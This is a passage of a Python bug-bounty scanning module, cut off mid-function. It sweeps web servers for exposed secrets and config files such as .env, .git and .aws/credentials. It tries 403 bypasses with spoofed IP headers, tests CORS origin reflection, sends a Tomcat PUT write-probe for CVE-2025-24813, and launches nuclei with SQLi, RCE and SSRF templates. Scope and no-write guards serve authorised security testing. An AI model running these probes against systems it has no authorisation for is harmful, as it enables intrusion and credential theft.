"""
Deep-scan probes — the layer beyond discovery + monitoring.

bb-sentinel's monitor loop detects *new* attack surface and scores it by URL
heuristics. Deep-scan goes further: it pulls each live URL through a set of
focused probes that produce **concrete, copy-pasteable findings** — exposed
files, version-vulnerable fingerprints, 403 bypasses, CORS misconfigs.

Each probe inherits from `DeepScanProbe` and returns `DeepScanFinding`
records carrying severity, signal type, and evidence. The orchestrator
`DeepScanner` runs them concurrently against a list of probed URLs (the same
`ProbeResult` shape produced by `discovery.HttpxProbe`).

The probes are deliberately **deterministic and copy-pasteable**: their
evidence is a real HTTP response that triagers can replay. This is the
counter-weight to "URL keyword + tech stack" heuristic scoring — the
heuristic tells you where to look; deep-scan tells you what to file.
"""
from __future__ import annotations

import asyncio
import re
from dataclasses import dataclass, field
from typing import Iterable

import httpx
import structlog

log = structlog.get_logger(__name__)


# -- Severity ladder used for scoring + filtering ---------------------------

SEVERITY_ORDER = ("critical", "high", "medium", "low", "info")
SEVERITY_WEIGHT = {"critical": 50, "high": 25, "medium": 10, "low": 4, "info": 1}


@dataclass
class DeepScanFinding:
    url: str
    probe: str            # which probe class produced this
    signal: str           # short token (e.g. "exposed-git-config")
    severity: str         # one of SEVERITY_ORDER
    title: str            # human-readable title
    evidence: str = ""    # excerpt of the HTTP response that proves it
    extra: dict = field(default_factory=dict)

    def weight(self) -> int:
        return SEVERITY_WEIGHT.get(self.severity, 0)


# -- Curated tables ---------------------------------------------------------

# Paths whose presence on a public URL is reportable (each tagged with
# severity and the signal type the probe emits if found). Status must be
# 2xx AND the body must not look like a generic 404 page.
HIGH_VALUE_PATHS: list[tuple[str, str, str]] = [
    # (path, signal-token, severity-if-real-200)
    # Source-control exposure
    ("/.git/HEAD",                    "exposed-git",            "high"),
    ("/.git/config",                  "exposed-git",            "high"),
    ("/.git/index",                   "exposed-git",            "high"),
    ("/.gitignore",                   "exposed-gitignore",      "info"),
    ("/.svn/entries",                 "exposed-svn",            "medium"),
    ("/.svn/wc.db",                   "exposed-svn",            "medium"),
    ("/.hg/store/00manifest.i",       "exposed-hg",             "medium"),
    ("/.bzr/branch/branch-format",    "exposed-bzr",            "medium"),
    # Env / config files
    ("/.env",                         "exposed-env",            "high"),
    ("/.env.local",                   "exposed-env",            "high"),
    ("/.env.production",              "exposed-env",            "high"),
    ("/.env.development",             "exposed-env",            "high"),
    ("/.env.dev",                     "exposed-env",            "high"),
    ("/.env.staging",                 "exposed-env",            "high"),
    ("/.env.backup",                  "exposed-env",            "high"),
    ("/config.json",                  "exposed-config-json",    "medium"),
    ("/config.yaml",                  "exposed-config-yaml",    "medium"),
    ("/settings.py",                  "exposed-django-settings","high"),
    ("/wp-config.php.bak",            "exposed-wp-config",      "critical"),
    ("/application.properties",       "exposed-spring-props",   "high"),
    ("/application.yml",              "exposed-spring-props",   "high"),
    # OS-level junk
    ("/.DS_Store",                    "exposed-dsstore",        "low"),
    ("/Thumbs.db",                    "exposed-thumbs",         "info"),
    ("/.htaccess",                    "exposed-htaccess",       "low"),
    ("/.htpasswd",                    "exposed-htpasswd",       "high"),
    # Source / db dump suffixes (no-path versions — file-suffix probe adds the
    # rest dynamically against discovered URLs)
    ("/backup.zip",                   "exposed-backup",         "high"),
    ("/backup.tar.gz",                "exposed-backup",         "high"),
    ("/backup.sql",                   "exposed-db-dump",        "high"),
    ("/db.sql",                       "exposed-db-dump",        "high"),
    ("/database.sql",                 "exposed-db-dump",        "high"),
    ("/dump.sql",                     "exposed-db-dump",        "high"),
    ("/site.zip",                     "exposed-backup",         "high"),
    ("/www.zip",                      "exposed-backup",         "high"),
    # Java app servers
    ("/WEB-INF/web.xml",              "exposed-webxml",         "high"),
    ("/META-INF/MANIFEST.MF",         "exposed-manifest",       "low"),
    ("/web.config",                   "exposed-webconfig",      "medium"),
    # Apache / Nginx / server status
    ("/server-status",                "exposed-apache-status",  "medium"),
    ("/server-info",                  "exposed-apache-info",    "medium"),
    ("/nginx-status",                 "exposed-nginx-status",   "medium"),
    ("/status",                       "exposed-status",         "low"),
    # API docs / Swagger / OpenAPI / GraphQL (15+ variants)
    ("/swagger",                      "exposed-swagger",        "low"),
    ("/swagger/",                     "exposed-swagger",        "low"),
    ("/swagger.json",                 "exposed-swagger-json",   "low"),
    ("/swagger-ui",                   "exposed-swagger-ui",     "low"),
    ("/swagger-ui/",                  "exposed-swagger-ui",     "low"),
    ("/swagger-ui.html",              "exposed-swagger-ui",     "low"),
    ("/swagger-ui/index.html",        "exposed-swagger-ui",     "low"),
    ("/api-docs",                     "exposed-api-docs",       "low"),
    ("/api/docs",                     "exposed-api-docs",       "low"),
    ("/api/swagger",                  "exposed-swagger",        "low"),
    ("/api/swagger.json",             "exposed-swagger-json",   "low"),
    ("/api/v1/swagger.json",          "exposed-swagger-json",   "low"),
    ("/v2/api-docs",                  "exposed-swagger-json",   "low"),
    ("/v3/api-docs",                  "exposed-openapi-json",   "low"),
    ("/openapi.json",                 "exposed-openapi-json",   "low"),
    ("/openapi.yaml",                 "exposed-openapi-yaml",   "low"),
    ("/redoc",                        "exposed-redoc",          "low"),
    ("/graphql",                      "exposed-graphql",        "low"),
    ("/graphiql",                     "exposed-graphiql",       "low"),
    ("/api/graphql",                  "exposed-graphql",        "low"),
    ("/__graphql",                    "exposed-graphql",        "low"),
    # Spring Boot Actuator (deeply expanded)
    ("/actuator",                     "exposed-actuator",       "medium"),
    ("/actuator/",                    "exposed-actuator",       "medium"),
    ("/actuator/env",                 "exposed-actuator-env",   "high"),
    ("/actuator/heapdump",            "exposed-actuator-heap",  "critical"),
    ("/actuator/mappings",            "exposed-actuator-map",   "medium"),
    ("/actuator/beans",               "exposed-actuator-beans", "medium"),
    ("/actuator/health",              "exposed-actuator-health","info"),
    ("/actuator/info",                "exposed-actuator-info",  "info"),
    ("/actuator/trace",               "exposed-actuator-trace", "high"),
    ("/actuator/httptrace",           "exposed-actuator-trace", "high"),
    ("/actuator/configprops",         "exposed-actuator-config","medium"),
    ("/actuator/loggers",             "exposed-actuator-loggers","low"),
    ("/actuator/threaddump",          "exposed-actuator-thread","medium"),
    ("/actuator/metrics",             "exposed-actuator-metrics","low"),
    ("/manage/actuator",              "exposed-actuator",       "medium"),
    ("/management/actuator",          "exposed-actuator",       "medium"),
    # DB consoles
    ("/h2-console",                   "exposed-h2-console",     "high"),
    ("/h2-console/login.jsp",         "exposed-h2-console",     "high"),
    ("/phpmyadmin/",                  "exposed-phpmyadmin",     "medium"),
    ("/myadmin/",                     "exposed-phpmyadmin",     "medium"),
    ("/adminer.php",                  "exposed-adminer",        "medium"),
    ("/pma/",                         "exposed-phpmyadmin",     "medium"),
    # Admin / dashboards (broad)
    ("/admin",                        "exposed-admin",          "low"),
    ("/admin/",                       "exposed-admin",          "low"),
    ("/administrator/",               "exposed-administrator",  "low"),
    ("/admin.php",                    "exposed-admin",          "low"),
    ("/dashboard",                    "exposed-dashboard",      "low"),
    ("/console",                      "exposed-console",        "low"),
    ("/manage",                       "exposed-manage",         "low"),
    ("/management",                   "exposed-management",     "low"),
    # CMS
    ("/wp-admin/",                    "exposed-wp-admin",       "low"),
    ("/wp-login.php",                 "exposed-wp-login",       "low"),
    ("/wp-content/uploads/",          "exposed-wp-uploads",     "low"),
    ("/wp-config.php.bak",            "exposed-wp-config-bak",  "critical"),
    ("/wp-json/wp/v2/users",          "exposed-wp-users",       "medium"),
    ("/joomla/administrator/",        "exposed-joomla-admin",   "low"),
    ("/user/login",                   "exposed-drupal-login",   "info"),
    # Java tooling
    ("/jenkins/",                     "exposed-jenkins",        "medium"),
    ("/jenkins/script",               "exposed-jenkins-script", "critical"),
    ("/gitlab/",                      "exposed-gitlab",         "low"),
    ("/nexus/",                       "exposed-nexus",          "low"),
    ("/artifactory/",                 "exposed-artifactory",    "low"),
    # Tomcat-specific
    ("/examples/",                    "tomcat-examples",        "low"),
    ("/examples/jsp/snp/snoop.jsp",   "tomcat-snoop",           "low"),
    ("/docs/",                        "tomcat-docs",            "low"),
    ("/manager/html",                 "tomcat-manager",         "medium"),
    ("/manager/status",               "tomcat-manager-status",  "low"),
    ("/host-manager/html",            "tomcat-host-manager",    "medium"),
    # Well-known
    ("/.well-known/security.txt",     "well-known-security",    "info"),
    ("/.well-known/openid-configuration", "well-known-oidc",    "info"),
    ("/.well-known/oauth-authorization-server", "well-known-oauth-as", "info"),
    # Cloud metadata / IaC artifacts
    ("/.aws/credentials",             "exposed-aws-creds",      "critical"),
    ("/.aws/config",                  "exposed-aws-config",     "high"),
    ("/cloud-config.yml",             "exposed-cloud-config",   "high"),
    ("/docker-compose.yml",           "exposed-docker-compose", "medium"),
    ("/Dockerfile",                   "exposed-dockerfile",     "low"),
    ("/.npmrc",                       "exposed-npmrc",          "high"),
    ("/.pypirc",                      "exposed-pypirc",         "high"),
    # Robots / sitemap (low-impact but used as crawl seeds)
    ("/robots.txt",                   "exposed-robots",         "info"),
    ("/sitemap.xml",                  "exposed-sitemap",        "info"),
    # Misc info-disclosure
    ("/phpinfo.php",                  "exposed-phpinfo",        "high"),
    ("/info.php",                     "exposed-phpinfo",        "high"),
    ("/test.php",                     "exposed-test-php",       "low"),
    ("/crossdomain.xml",              "exposed-crossdomain",    "info"),
    ("/clientaccesspolicy.xml",       "exposed-silverlight",    "info"),
]


# Common backup/source extensions to try against *discovered* URLs (the
# BackupFileProbe appends these to any 200-static-resource URL it sees).
BACKUP_SUFFIXES: tuple[str, ...] = (
    ".bak", ".old", ".orig", ".swp", ".tmp", ".backup", ".save", ".copy",
    "~", ".1", ".gz", ".zip",
)

BYPASS_HEADERS: list[tuple[str, str | None]] = [
    ("X-Forwarded-For", "127.0.0.1"),
    ("X-Real-IP", "127.0.0.1"),
    ("X-Originating-IP", "127.0.0.1"),
    ("X-Custom-IP-Authorization", "127.0.0.1"),
    ("X-Original-URL", "/"),
    ("X-Rewrite-URL", "/"),
    ("X-HTTP-Method-Override", "GET"),
]


# Tomcat version → CVE bands. (max_vuln_version, cve_id, severity, title).
# Each row "applies if installed version <= max_vuln_version". Tomcat 9.x
# only — extend for 8.x/10.x/11.x if you target those.
TOMCAT9_CVE_BANDS: list[tuple[str, str, str, str]] = [
    ("9.0.98", "CVE-2025-24813", "critical",
     "Path-equivalence partial-PUT + GET → RCE on writable default servlet"),
    ("9.0.97", "CVE-2024-56337", "high",
     "TOCTOU race in default servlet → RCE on case-insensitive filesystems"),
    ("9.0.95", "CVE-2024-52317", "high",
     "Request/response mixup under HTTP/2"),
    ("9.0.95", "CVE-2024-52316", "high",
     "Java auth bypass under specific config"),
    ("9.0.86", "CVE-2024-34750", "medium",
     "HTTP/2 DoS via excess header processing"),
    ("9.0.78", "CVE-2023-46589", "medium",
     "HTTP/2 request smuggling"),
    ("9.0.78", "CVE-2023-45648", "high",
     "Request smuggling via malformed trailer headers"),
    ("9.0.79", "CVE-2023-41080", "medium",
     "Open redirect in FORM auth"),
    ("9.0.65", "CVE-2022-42252", "high",
     "Request smuggling when rejectIllegalHeader=false"),
    ("9.0.63", "CVE-2022-34305", "medium",
     "Reflected XSS in bundled /examples/jsp/cal/cal2.jsp"),
    ("9.0.39", "CVE-2020-13935", "high",
     "WebSocket payload length DoS"),
    ("9.0.30", "CVE-2020-1938", "critical",
     "GhostCat: AJP local-file-include / RCE if AJP port exposed"),
]


# -- Probe base + concrete probes -------------------------------------------

class DeepScanProbe:
    name: str = "deepscan-probe"
    timeout: float = 8.0

    def __init__(self, client: httpx.AsyncClient, semaphore: asyncio.Semaphore,
                 rate_limit_rps: int | None = None,
                 auth_headers: dict[str, str] | None = None,
                 in_scope_hosts: frozenset[str] | None = None,
                 no_write_methods: bool = False) -> None:
        self.client = client
        self.sem = semaphore
        # Per-program outbound RPS cap. Probes that shell out to subprocess
        # tools (nuclei, etc.) should pass this through to those tools'
        # own rate-limit flags so we don't violate program policy.
        self.rate_limit_rps = rate_limit_rps
        # Auth headers carried per program. Scope-restricted: only sent on
        # requests whose host is in `in_scope_hosts`. Prevents leaking the
        # auth token to third-party CDNs and external JS hosts during
        # js-mine / cors / etc.
        self.auth_headers = auth_headers or {}
        self.in_scope_hosts = in_scope_hosts or frozenset()
        # Engagement guardrail: when true, this probe MUST NOT send any
        # request that modifies remote state (PUT/POST/DELETE/PATCH).
        # Subclasses that perform write-probes check this flag and either
        # skip the write step entirely or downgrade to read-only behavior.
        # Set per-program via ProgramConfig.no_write_methods — required
        # for programs whose ToS bans data modification (ban risk).
        self.no_write_methods = no_write_methods

    def _headers_for(self, url: str) -> dict[str, str]:
        """Return auth headers iff the URL's host is in scope; else empty dict.

        Used by the request helpers below so probes can do scope-aware auth
        without each probe re-implementing the check.
        """
        if not self.auth_headers:
            return {}
        try:
            from urllib.parse import urlparse
            host = urlparse(url).netloc.split(":")[0].lower()
        except Exception:
            return {}
        if not host:
            return {}
        # Match on suffix so subdomains of in-scope roots also get auth
        for in_scope in self.in_scope_hosts:
            if host == in_scope or host.endswith("." + in_scope):
                return dict(self.auth_headers)
        return {}

    async def run(self, probes: list[dict]) -> list[DeepScanFinding]:
        raise NotImplementedError

    async def _get(self, url: str, *, headers: dict | None = None,
                   follow: bool = False) -> httpx.Response | None:
        # Merge program auth (scope-restricted) under any caller-supplied
        # headers — caller wins on conflicts so probe-specific headers
        # (e.g. CORS Origin overrides) still work.
        scope_auth = self._headers_for(url)
        if scope_auth:
            merged = dict(scope_auth)
            if headers: merged.update(headers)
            headers = merged
        async with self.sem:
            try:
                return await self.client.get(url, headers=headers,
                                             timeout=self.timeout,
                                             follow_redirects=follow)
            except Exception:
                return None


class PathSweep(DeepScanProbe):
    """Probe each base URL for high-value paths, but only flag a finding
    when the response actually looks like the *real* file (not a vhost
    fallback that returns the same HTML wrapper for every path).

    Filters applied per candidate response:
      - Status must be 200 OR 206
      - Body must NOT match the base URL's body (same length + same prefix
        = fallback to wrapper; reject)
      - Content-Type must be plausible for the signal type
        (e.g. /actuator/heapdump should not be text/html)
      - Body must not contain generic 404 hints
    """
    name = "path-sweep"
    GENERIC_404_HINTS = (b"<title>404", b"page not found", b"not found</")
    # Per-signal Content-Type sanity. Empty/missing Content-Type is NOT a
    # match — forces the server to declare a plausible type before we flag
    # the finding. Eliminates "200 OK with empty body" false positives.
    CONTENT_TYPE_EXPECT: dict[str, tuple[str, ...]] = {
        "exposed-git":               ("text/plain", "application/octet-stream"),
        "exposed-env":               ("text/plain", "application/octet-stream"),
        "exposed-svn":               ("text/plain", "application/octet-stream"),
        "exposed-backup":            ("application/zip", "application/x-gzip",
                                       "application/x-tar", "application/octet-stream"),
        "exposed-db-dump":           ("text/plain", "application/sql",
                                       "application/octet-stream"),
        "exposed-actuator-heap":     ("application/octet-stream",
                                       "application/vnd.spring-boot.actuator.v3+json"),
        "exposed-actuator-env":      ("application/json",
                                       "application/vnd.spring-boot.actuator.v3+json"),
        "exposed-actuator":          ("application/json",
                                       "application/vnd.spring-boot.actuator.v3+json"),
        "exposed-actuator-map":      ("application/json",
                                       "application/vnd.spring-boot.actuator.v3+json"),
        "exposed-actuator-beans":    ("application/json",
                                       "application/vnd.spring-boot.actuator.v3+json"),
        "exposed-swagger-json":      ("application/json",),
        "exposed-openapi-json":      ("application/json",),
        "exposed-swagger-ui":        ("text/html",),
        "exposed-graphql":           ("application/json", "text/html"),
    }

    MIN_BODY_BYTES = 16  # responses shorter than this can't carry meaningful exposure

    async def _learn_fallback(self, base: str) -> dict | None:
        """Fetch a guaranteed-nonexistent sentinel path. If the server returns
        200 with content, we capture its (length, prefix) — any later path
        probe that matches this fingerprint is the same 200-fallback wrapper,
        not the real file."""
        sentinel = base.rstrip("/") + "/bb-sentinel-nonexistent-DELETEME-9z9z9z9z"
        r = await self._get(sentinel)
        if r is None:
            return None
        # Also fetch the root, since some apps return SPA wrapper for / and
        # totally different content for some real paths
        r_root = await self._get(base.rstrip("/") + "/")
        out = {"sentinel_status": r.status_code,
               "sentinel_len": len(r.content),
               "sentinel_prefix": r.content[:200],
               "root_len": len(r_root.content) if r_root else None,
               "root_prefix": r_root.content[:200] if r_root else None}
        return out

    async def run(self, probes: list[dict]) -> list[DeepScanFinding]:
        findings: list[DeepScanFinding] = []
        bases = sorted({p["url"] for p in probes
                        if p.get("status_code") and 200 <= p["status_code"] < 400})
        log.info("path-sweep", bases=len(bases), paths=len(HIGH_VALUE_PATHS))

        baselines = dict(zip(bases,
                              await asyncio.gather(*(self._learn_fallback(b) for b in bases))))

        def content_type_ok(signal: str, ctype: str) -> bool:
            allowed = self.CONTENT_TYPE_EXPECT.get(signal)
            if not allowed: return True
            ctype_l = (ctype or "").lower().split(";")[0].strip()
            return any(ctype_l.startswith(a) for a in allowed if a)

        def looks_like_fallback(base: str, status: int, body: bytes) -> bool:
            bl = baselines.get(base)
            if bl is None: return False
            # If sentinel returned 200 with this same body — same wrapper
            if bl["sentinel_status"] == 200:
                if len(body) == bl["sentinel_len"] and body[:200] == bl["sentinel_prefix"]:
                    return True
                if abs(len(body) - bl["sentinel_len"]) <= 32 and body[:100] == bl["sentinel_prefix"][:100]:
                    return True
            # Or body identical to the root page
            if bl["root_len"] is not None:
                if len(body) == bl["root_len"] and body[:200] == bl["root_prefix"]:
                    return True
            return False

        async def check(base: str, path: str, signal: str, sev: str):
            r = await self._get(base.rstrip("/") + path)
            if r is None or r.status_code not in (200, 206):
                return None
            body = r.content
            # Tighten: body must be non-trivial size
            if len(body) < self.MIN_BODY_BYTES:
                return None
            body_l = body[:512].lower()
            for hint in self.GENERIC_404_HINTS:
                if hint in body_l: return None
            if looks_like_fallback(base, r.status_code, body):
                return None
            ctype = r.headers.get("content-type", "")
            if not content_type_ok(signal, ctype):
                return None
            return DeepScanFinding(
                url=base.rstrip("/") + path, probe=self.name,
                signal=signal, severity=sev,
                title=f"{signal} on {base}",
                evidence=body.decode("utf-8", errors="replace")[:300],
                extra={"content-type": ctype, "length": len(body)},
            )

        tasks = [check(b, p, sig, sev)
                 for b in bases for (p, sig, sev) in HIGH_VALUE_PATHS]
        for f in await asyncio.gather(*tasks):
            if f is not None:
                findings.append(f)
        return findings


class Bypass403(DeepScanProbe):
    name = "bypass-403"

    async def run(self, probes: list[dict]) -> list[DeepScanFinding]:
        targets = [p["url"] for p in probes if p.get("status_code") == 403]
        log.info("bypass-403", targets=len(targets))
        findings: list[DeepScanFinding] = []

        async def try_one(url: str, header: str, value: str | None):
            hdrs = {header: value} if value is not None else {}
            r = await self._get(url, headers=hdrs)
            if r is None or r.status_code == 403:
                return None
            return DeepScanFinding(
                url=url, probe=self.name,
                signal=f"bypass-via-{header.lower()}",
                severity="medium" if r.status_code == 200 else "low",
                title=f"403 bypass via {header}: {r.status_code}",
                evidence=r.text[:200] if r.text else "",
                extra={"header": header, "value": value,
                       "new-status": r.status_code},
            )
        tasks = [try_one(u, h, v) for u in targets for (h, v) in BYPASS_HEADERS]
        for f in await asyncio.gather(*tasks):
            if f is not None: findings.append(f)
        return findings


class CorsProbe(DeepScanProbe):
    name = "cors-reflect"
    BAD_ORIGINS = ("https://evil.example.com", "null")

    async def run(self, probes: list[dict]) -> list[DeepScanFinding]:
        targets = [p["url"] for p in probes
                   if p.get("status_code") and 200 <= p["status_code"] < 400]
        findings: list[DeepScanFinding] = []

        async def try_origin(url: str, origin: str):
            r = await self._get(url, headers={"Origin": origin})
            if r is None: return None
            aco = r.headers.get("access-control-allow-origin", "")
            acc = r.headers.get("access-control-allow-credentials", "").lower()
            if not aco: return None
            severity = None
            if aco == origin and acc == "true":
                severity = "high"
            elif aco == "*" and acc == "true":
                severity = "medium"
            elif aco == origin:
                severity = "low"
            if not severity:
                return None
            return DeepScanFinding(
                url=url, probe=self.name,
                signal="cors-origin-reflection" if aco == origin else "cors-wildcard-with-creds",
                severity=severity,
                title=f"CORS reflects {origin} (credentials={acc or 'false'})",
                evidence=f"Origin: {origin}\nAccess-Control-Allow-Origin: {aco}\n"
                         f"Access-Control-Allow-Credentials: {acc}",
                extra={"origin-sent": origin, "aco": aco, "acc": acc},
            )
        tasks = [try_origin(u, o) for u in targets for o in self.BAD_ORIGINS]
        for f in await asyncio.gather(*tasks):
            if f is not None: findings.append(f)
        return findings


class TomcatFingerprint(DeepScanProbe):
    """Probe Tomcat /docs/ + error pages for version, cross-reference CVEs.

    Also tests for the CVE-2025-24813 *prerequisite* (writable default
    servlet + partial PUT). The CVE itself requires a multi-step chain; we
    only verify the precondition non-destructively (OPTIONS + a small PUT
    to a sentinel path that we immediately DELETE if it was accepted).
    """
    name = "tomcat-fingerprint"
    VERSION_RE = re.compile(r"Apache Tomcat[/ ]+(\d+\.\d+\.\d+)", re.I)
    TITLE_VERSION_RE = re.compile(r"Apache Tomcat (\d+) \((\d+\.\d+\.\d+)\)", re.I)
    PUT_PROBE_PATH = "/bb-sentinel-write-probe-DELETE-ME.txt"
    PUT_PROBE_BODY = b"bb-sentinel deepscan write-probe; please delete\n"

    async def run(self, probes: list[dict]) -> list[DeepScanFinding]:
        bases = sorted({p["url"] for p in probes
                        if p.get("status_code") and 200 <= p["status_code"] < 400})
        findings: list[DeepScanFinding] = []

        async def fingerprint(base: str):
            r = await self._get(base.rstrip("/") + "/docs/")
            if r is None or r.status_code != 200:
                return None
            m = self.TITLE_VERSION_RE.search(r.text or "")
            if not m:
                m2 = self.VERSION_RE.search(r.text or "")
                if not m2: return None
                version = m2.group(1)
            else:
                version = m.group(2)
            return base, version

        async def check_put(base: str) -> tuple[str, dict]:
            """Non-destructively test PUT writability. We attempt PUT once,
            note the status, then immediately DELETE if 200/201/204 came back."""
            base = base.rstrip("/")
            target = base + self.PUT_PROBE_PATH
            # Step 1: OPTIONS to see if PUT is in Allow
            opt = await self._get(base + "/", headers={"Method": "OPTIONS"})  # GET fallback
            # httpx doesn't easily support arbitrary verb via _get — do raw
            async with self.sem:
                try:
                    opt_resp = await self.client.request("OPTIONS", base + "/",
                                                          timeout=self.timeout)
                    allow = opt_resp.headers.get("allow", "")
                except Exception:
                    allow = ""
            async with self.sem:
                try:
                    put_resp = await self.client.request(
                        "PUT", target, content=self.PUT_PROBE_BODY,
                        headers={"Content-Type": "text/plain"},
                        timeout=self.timeout,
                    )
                    put_status = put_resp.status_code
                except Exception as e:
                    return base, {"allow": allow, "put-status": 0, "put-err": str(e)[:80]}
            # Confirm writability: 200/201/204 = wrote it. If so, immediately try GET + DELETE.
            verified_get = None
            if put_status in (200, 201, 204):
                async with self.sem:
                    try:
                        g = await self.client.get(target, timeout=self.timeout)
                        if g.status_code == 200 and self.PUT_PROBE_BODY.decode() in (g.text or ""):
                            verified_get = True
                    except Exception:
                        pass
                async with self.sem:
                    try:
                        await self.client.request("DELETE", target, timeout=self.timeout)
                    except Exception:
                        pass
            return base, {"allow": allow, "put-status": put_status,
                          "verified-write": verified_get}

        # 1) Detect version per host
        fp_results = await asyncio.gather(*(fingerprint(b) for b in bases))
        fp_results = [r for r in fp_results if r]

        # 2) For confirmed-Tomcat hosts, also check PUT — UNLESS the program
        # has no_write_methods set. The PUT-probe writes a sentinel file
        # (/bb-sentinel-write-probe-DELETE-ME.txt) and DELETEs it after
        # verification; on programs whose ToS bans data modification (e.g.
        # T-Mobile's Vistar/Blis "do not modify any data within customer
        # accounts" clause), even the transient write is unacceptable —
        # violation results in a platform ban. Version disclosure / CVE
        # cross-reference still runs from the /docs/ fingerprint.
        if self.no_write_methods:
            log.info("tomcat-put-probe skipped: no_write_methods guard",
                     probe=self.name, hosts=len(fp_results))
            put_map: dict[str, dict] = {}
        else:
            put_results = await asyncio.gather(*(check_put(b) for b, _ in fp_results))
            put_map = {b: info for b, info in put_results}

        for base, version in fp_results:
            put_info = put_map.get(base, {})
            put_writable = put_info.get("verified-write") is True
            # PUT-writable on a Tomcat in CVE-2025-24813 range = critical pre-req
            if put_writable:
                findings.append(DeepScanFinding(
                    url=base.rstrip("/") + self.PUT_PROBE_PATH, probe=self.name,
                    signal="tomcat-put-writable",
                    severity="critical",
                    title=f"Tomcat {version} accepts unauthenticated PUT — "
                          "satisfies CVE-2025-24813 precondition",
                    evidence=f"PUT {self.PUT_PROBE_PATH} → {put_info.get('put-status')}\n"
                             f"GET verified body match.\nAllow header: {put_info.get('allow')}",
                    extra={"version": version, **put_info},
                ))
            # 2) Cross-reference CVE bands
            applicable = [(cve, sev, title) for (max_v, cve, sev, title)
                          in TOMCAT9_CVE_BANDS
                          if _semver_le(version, max_v)]
            if not applicable:
                # Still record the version disclosure as info
                findings.append(DeepScanFinding(
                    url=base.rstrip("/") + "/docs/", probe=self.name,
                    signal="tomcat-version-disclosed",
                    severity="info",
                    title=f"Apache Tomcat {version} disclosed via /docs/",
                    evidence=f"Apache Tomcat {version}",
                    extra={"version": version},
                ))
                continue
            # Highest-severity applicable CVE drives the finding severity
            sev_idx = min(SEVERITY_ORDER.index(s) for _, s, _ in applicable)
            top_sev = SEVERITY_ORDER[sev_idx]
            cve_list = ", ".join(c for c, _, _ in applicable[:5])
            findings.append(DeepScanFinding(
                url=base.rstrip("/") + "/docs/", probe=self.name,
                signal="tomcat-version-vulnerable",
                severity=top_sev,
                title=f"Apache Tomcat {version} — {len(applicable)} applicable CVEs",
                evidence=f"Version banner: 'Apache Tomcat {version}'\n"
                         f"Applicable CVEs (top {min(5,len(applicable))}): {cve_list}",
                extra={"version": version,
                       "cves": [{"id": c, "severity": s, "title": t}
                                for c, s, t in applicable]},
            ))
            # Also flag /examples/ if reachable — same host
            r2 = await self._get(base.rstrip("/") + "/examples/")
            if r2 and r2.status_code == 200:
                findings.append(DeepScanFinding(
                    url=base.rstrip("/") + "/examples/", probe=self.name,
                    signal="tomcat-examples-exposed",
                    severity="low",
                    title="Tomcat bundled /examples/ webapp publicly reachable",
                    evidence=(r2.text or "")[:200],
                ))
        return findings


def _semver_le(a: str, b: str) -> bool:
    """True if a <= b in dotted-int semver (no pre-release support)."""
    pa = [int(x) for x in a.split(".") if x.isdigit()]
    pb = [int(x) for x in b.split(".") if x.isdigit()]
    n = max(len(pa), len(pb))
    pa += [0] * (n - len(pa))
    pb += [0] * (n - len(pb))
    return pa <= pb


class OwaspVulnsProbe(DeepScanProbe):
    """The injection-class coverage layer. Runs nuclei against the live URLs
    with a curated set of vuln-class template trees, filtered to medium+
    severity so we don't drown in info-level noise the user explicitly
    declines to chase ([[bb-hunting-impact-first]]).

    Covers: SQLi, LFI, RCE, SSRF, XXE, SSTI, open-redirect, subdomain
    takeover, default credentials, and recent (2024-2025) CVE PoCs. Each
    nuclei match becomes a DeepScanFinding with the template's reported
    severity. The single nuclei invocation amortizes startup over all
    URLs × all templates.

    Resource budget: at 15 concurrency the probe sustains roughly 30-60 RPS
    against an unrestricted target. With program rate_limit_rps set it
    drops to that cap via nuclei's -rate-limit. Hard timeout default 40min;
    nuclei is killed if exceeded.
    """
    name = "owasp-vulns"
    NUCLEI_BIN = "/usr/bin/nuclei"
    # Curated for the bug-bounty-relevant OWASP classes. Skip /xss explicitly
    # — solo XSS is on the user's never-submit list. SSTI / Java
    # deserialization / template-injection variants still surface here via
    # the vulns/ssti tree.
    TEMPLATE_TREES = (
        "http/vulnerabilities/sqli",
        "http/vulnerabilities/lfi",
        "http/vulnerabilities/rce",
        "http/vulnerabilities/ssrf",
        "http/vulnerabilities/xxe",
        "http/vulnerabilities/ssti",
        "http/vulnerabilities/redirect",
        "http/vulnerabilities/file-upload",
        "http/vulnerabilities/generic",
        "http/takeovers",
        "http/default-logins",
        "http/cves/2025",
        "http/cves/2024",
    )
    SEVERITY_FILTER = "medium,high,critical"
    MAX_URLS = 100   # cap to avoid runaway long scans
    NUCLEI_TIMEOUT = 2400   # 40 min hard cap

    async def run(self, probes: list[dict]) -> list[DeepScanFinding]:
        import shutil as _shutil, json as _json
        urls = sorted({p["url"] for p in probes
                       if p.get("status_code") and 200 <= p["status_code"] < 400})
        if not urls:
            return []
        if not _shutil.which(self.NUCLEI_BIN.rsplit("/", 1)[-1]) and not Path(self.NUCLEI_BIN).exists():
            log.warning("owasp-vulns: nuclei not found", binary=self.NUCLEI_BIN)
            return []
        if len(urls) > self.MAX_URLS:
            log.info("owasp-vulns: capping URL set", available=len(urls), cap=self.MAX_URLS)
            urls = urls[: self.MAX_URLS]
        log.info("owasp-vulns probe starting",
                 urls=len(urls), trees=len(self.TEMPLATE_TREES),
                 rate_limit_rps=self.rate_limit_rps)

        cmd = [
            self.NUCLEI_BIN,
            "-silent", "-jsonl", "-no-color", "-disable-update-check",
            "-severity", self.SEVERITY_FILTER,
            "-c", "15",
        ]
        # Respect per-program tree exclusions (set by DeepScanner from
        # ProgramConfig.nuclei_exclude_trees). Falls back to the class
        # default if no override has been wired in.
        trees = getattr(self, "template_trees_override", None) or self.TEMPLATE_TREES
        for t in trees:
            cmd += ["-t", t]
        if self.rate_limit_rps is not None:
            cmd += ["-rate-limit", str(self.rate_limit_rps)]
        for k, v in (self.auth_headers or {}).items():
            cmd += ["-H", f"{k}: {v}"]
        proc = await asyncio.create_subprocess_exec(
            *cmd,
            stdin=asyncio.subprocess.PIPE,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
        )
        try:
            stdout, stderr = await asyncio.wait_for(
                proc.communicate(input="\n".join(urls).encode()),
                timeout=self.NUCLEI_TIMEOUT,
            )
        except asyncio.TimeoutError:
            proc.kill()
            await proc.wait()
            log.warning("owasp-vulns: nuclei timed out", timeout=self.NUCLEI_TIMEOUT)
            return []
        if proc.returncode and not stdout:
            err = stderr.decode(errors="replace")[:200]
            log.warning("owasp-vulns: nuclei failed", rc=proc.returncode, stderr=err)
            return []

        findings: list[DeepScanFinding] = []
        for line in stdout.decode(errors="replace").splitlines():
            line = line.strip()
            if not line:
                continue
            try:
                obj = _json.loads(line)
